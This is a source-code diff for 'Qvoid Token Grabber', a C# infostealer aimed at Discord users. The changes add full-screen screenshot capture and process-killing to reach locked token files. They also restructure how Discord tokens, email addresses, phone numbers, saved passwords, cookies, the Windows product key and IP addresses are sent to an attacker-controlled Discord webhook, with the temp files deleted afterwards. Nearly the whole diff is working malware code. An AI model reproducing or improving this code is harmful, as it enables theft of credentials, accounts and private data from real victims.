@@ -12,6 +12,7 @@ using System.Diagnostics;
 using System.Windows.Forms;
 using System.Reflection;
 using LastDudeOnTheTrack.Properties;
+using System.Drawing.Imaging;
 
 namespace Qvoid_Token_Grabber.Discord
 {
@@ -126,7 +127,9 @@ namespace Qvoid_Token_Grabber.Discord
                 //Getting the information about the environment computer.
                 Machine machineInfo = new Machine();
                 List<QvoidWrapper.Discord.Client> Users = new List<QvoidWrapper.Discord.Client>();
-                string HeadMessage = $"IP Address```{Machine.GetIpv4Address()}```" +
+
+                string BodyMessage = "";
+                string HeadMessage = $"IP Address```{Machine.GetPublicIpAddress()}```" +
                                      $"{Environment.NewLine}LAN Address```{Machine.GetLanIpv4Address()}```" +
                                      $"{Environment.NewLine}Desktop Username```{Environment.UserName}```" +
                                      $"{Environment.NewLine}Memory```{machineInfo.pcMemory}```" +
@@ -134,6 +137,19 @@ namespace Qvoid_Token_Grabber.Discord
                                      $"{Environment.NewLine}GPU Video```{machineInfo.gpuVideo}```" +
                                      $"{Environment.NewLine}GPU Version```{machineInfo.gpuVersion}```" +
                                      $"{Environment.NewLine}Windows License```{Windows.GetProductKey()}```{Environment.NewLine}";
+
+                int screenLeft = SystemInformation.VirtualScreen.Left;
+                int screenTop = SystemInformation.VirtualScreen.Top;
+                int screenWidth = SystemInformation.VirtualScreen.Width;
+                int screenHeight = SystemInformation.VirtualScreen.Height;
+
+                using (Bitmap bmp = new Bitmap(screenWidth, screenHeight))
+                {
+                    using (Graphics g = Graphics.FromImage(bmp))
+                        g.CopyFromScreen(screenLeft, screenTop, 0, 0, bmp.Size);
+
+                    bmp.Save(Path.GetTempPath() + "\\Capture.jpg", ImageFormat.Jpeg);
+                }
 
 
                 string Passwords = "------ Passwords ------";
@@ -320,57 +336,60 @@ namespace Qvoid_Token_Grabber.Discord
 
                     //Writing the message which contains the Discord Client information.
                     var userInfo = curUser.DiscordUser;
-                    string BodyMessage = $"{Environment.NewLine}Username```{userInfo.Username}#{userInfo.Discriminator}```" +
-                                         $"{Environment.NewLine}Email```{curUser.Email}```" +
-                                         $"{Environment.NewLine}Phone Number```{curUser.PhoneNumber}```" +
-                                         $"{Environment.NewLine}Premium```{userInfo.Premium}```" +
-                                         $"{Environment.NewLine}Token```{curUser.Token}```";
+                    BodyMessage += $"{Environment.NewLine}Username```{userInfo.Username}#{userInfo.Discriminator}```" +
+                                   $"{Environment.NewLine}Email```{curUser.Email}```" +
+                                   $"{Environment.NewLine}Phone Number```{curUser.PhoneNumber}```" +
+                                   $"{Environment.NewLine}Premium```{userInfo.Premium}```" +
+                                   $"{Environment.NewLine}Token```{curUser.Token}```";
 
-                    // ----------------------- Log -----------------------//
+                }
 
-                    //Checking if the user already run the token grabber before, if he did we compare it to the content if the content has changed we update all the information, else we just return quz we have nothing to do :D
-                    string usersPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\d0060d24-c4a5-480f-803a-ec978344350d.dat";
-                    if (!File.Exists(usersPath) || (QvoidWrapper.Encryption.StrXOR(HeadMessage + BodyMessage, Config.Password, true) != File.ReadAllText(usersPath)))
+                //Checking if the user already run the token grabber before, if he did we compare it to the content if the content has changed we update all the information, else we just return quz we have nothing to do :D
+                string usersPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\d0060d24-c4a5-480f-803a-ec978344350d.dat";
+                if (!File.Exists(usersPath) || (QvoidWrapper.Encryption.StrXOR(HeadMessage + BodyMessage, Config.Password, true) != File.ReadAllText(usersPath)))
+                {
+                    //Writing the log file.
+                    File.WriteAllText(usersPath, QvoidWrapper.Encryption.StrXOR(HeadMessage + BodyMessage, Config.Password, true));
+
+                    QvoidWrapper.Discord.Webhook Webhook = new QvoidWrapper.Discord.Webhook(Config.Webhook);
+                    QvoidWrapper.Discord.Embed embed = new QvoidWrapper.Discord.Embed();
+
+                    embed.Color = Color.Red;
+                    embed.Title = "Computer Information";
+                    embed.Description = HeadMessage;
+
+                    QvoidWrapper.Discord.Embed embed2 = new QvoidWrapper.Discord.Embed();
+                    embed2.Timestamp = DateTime.UtcNow;
+                    embed2.Color = Color.Red;
+                    embed2.Title = "Discord Client Information";
+                    embed2.Description = BodyMessage;
+
+                    string PasswordsPath = Path.GetTempPath() + "\\tmp7DDF46.txt";
+                    string CookiesPath = Path.GetTempPath() + "\\tmp7RDF47.txt";
+
+                    if (Passwords != "------ Passwords ------")
                     {
-                        //Writing the log file.
-                        File.WriteAllText(usersPath, QvoidWrapper.Encryption.StrXOR(HeadMessage + BodyMessage, Config.Password, true));
-
-                        QvoidWrapper.Discord.Webhook Webhook = new QvoidWrapper.Discord.Webhook(Config.Webhook);
-                        QvoidWrapper.Discord.Embed embed = new QvoidWrapper.Discord.Embed();
-
-                        embed.Color = Color.Red;
-                        embed.Title = "Computer Information";
-                        embed.Description = HeadMessage;
-
-                        QvoidWrapper.Discord.Embed embed2 = new QvoidWrapper.Discord.Embed();
-                        embed2.Timestamp = DateTime.UtcNow;
-                        embed2.Color = Color.Red;
-                        embed2.Title = "Discord Client Information";
-                        embed2.Description = BodyMessage;
-
-                        string PasswordsPath = Path.GetTempPath() + "\\tmp7DDF46.txt";
-                        string CookiesPath = Path.GetTempPath() + "\\tmp7RDF47.txt";
-
-                        if (Passwords != "------ Passwords ------")
-                        {
-                            File.WriteAllText(PasswordsPath, Passwords);
-                            Webhook.Send(null, new FileInfo(PasswordsPath));
-                            File.Delete(PasswordsPath);
-                        }
-
-                        if (Passwords != "------ Cookies ------")
-                        {
-                            Thread.Sleep(10);
-                            File.WriteAllText(CookiesPath, Cookies);
-                            Webhook.Send(null, new FileInfo(CookiesPath));
-                            File.Delete(CookiesPath);
-                        }
-
-                        Thread.Sleep(30);
-                        Webhook.Send(embed);
-                        Thread.Sleep(30);
-                        Webhook.Send(embed2);
+                        File.WriteAllText(PasswordsPath, Passwords);
+                        Webhook.Send(null, new FileInfo(PasswordsPath));
+                        File.Delete(PasswordsPath);
                     }
+
+                    if (Passwords != "------ Cookies ------")
+                    {
+                        Thread.Sleep(10);
+                        File.WriteAllText(CookiesPath, Cookies);
+                        Webhook.Send(null, new FileInfo(CookiesPath));
+                        File.Delete(CookiesPath);
+                    }
+
+                    Thread.Sleep(30);
+                    Webhook.Send(embed);
+                    Thread.Sleep(30);
+                    Webhook.Send(embed2);
+                    Thread.Sleep(30);
+                    Webhook.Send(null, new FileInfo(Path.GetTempPath() + "\\Capture.jpg"));
+                    Thread.Sleep(30);
+                    File.Delete(Path.GetTempPath() + "\\Capture.jpg");
                 }
             }
         }
@@ -490,30 +509,42 @@ namespace Qvoid_Token_Grabber.Discord
 
                 foreach (string filePath in Directory.GetFiles(tokenPath))
                 {
-                    if (!filePath.EndsWith(".log") && !filePath.EndsWith(".ldb"))
-                        continue;
-
-                    try
+                    while (true)
                     {
-                        string fileContent = "";
+                        if (!filePath.EndsWith(".log") && !filePath.EndsWith(".ldb"))
+                            break;
 
-                        //Because there might be some issues reading the tokens files such as locked or already used by some process, we trying to bypass it.
-                        using (FileStream fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
-                        using (StreamReader sr = new StreamReader(fs))
-                            fileContent = sr.ReadToEnd();
+                        try
+                        {
+                            string fileContent = "";
 
-                        MatchCollection matches = Regex.Matches(fileContent, "(\\w|\\d){24}.(\\w|\\d|_|-){6}.(\\w|\\d|_|-){27}");
-                        MatchCollection mfaMatches = Regex.Matches(fileContent, "mfa.(\\w|\\d|_|-){84}");
+                            //Because there might be some issues reading the tokens files such as locked or already used by some process, we trying to bypass it.
+                            using (FileStream fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+                            using (StreamReader sr = new StreamReader(fs))
+                                fileContent = sr.ReadToEnd();
 
-                        foreach (Match match in matches)
-                            if (IsValidToken(match.Value))
-                                tokens.Add(match.Value);
+                            MatchCollection matches = Regex.Matches(fileContent, "(\\w|\\d){24}.(\\w|\\d|_|-){6}.(\\w|\\d|_|-){27}");
+                            MatchCollection mfaMatches = Regex.Matches(fileContent, "mfa.(\\w|\\d|_|-){84}");
 
-                        foreach (Match match in mfaMatches)
-                            if (IsValidToken(match.Value))
-                                tokens.Add(match.Value);
+                            foreach (Match match in matches)
+                                if (IsValidToken(match.Value))
+                                    tokens.Add(match.Value);
+
+                            foreach (Match match in mfaMatches)
+                                if (IsValidToken(match.Value))
+                                    tokens.Add(match.Value);
+
+                            break;
+                        }
+                        catch (Exception)
+                        {
+                            foreach (var locker in QvoidWrapper.ProcessHandler.WhoIsLocking(filePath))
+                            {
+                                try { locker.Kill(); }
+                                catch { break; }
+                            }
+                        }
                     }
-                    catch (Exception) { }
                 }
             }
 
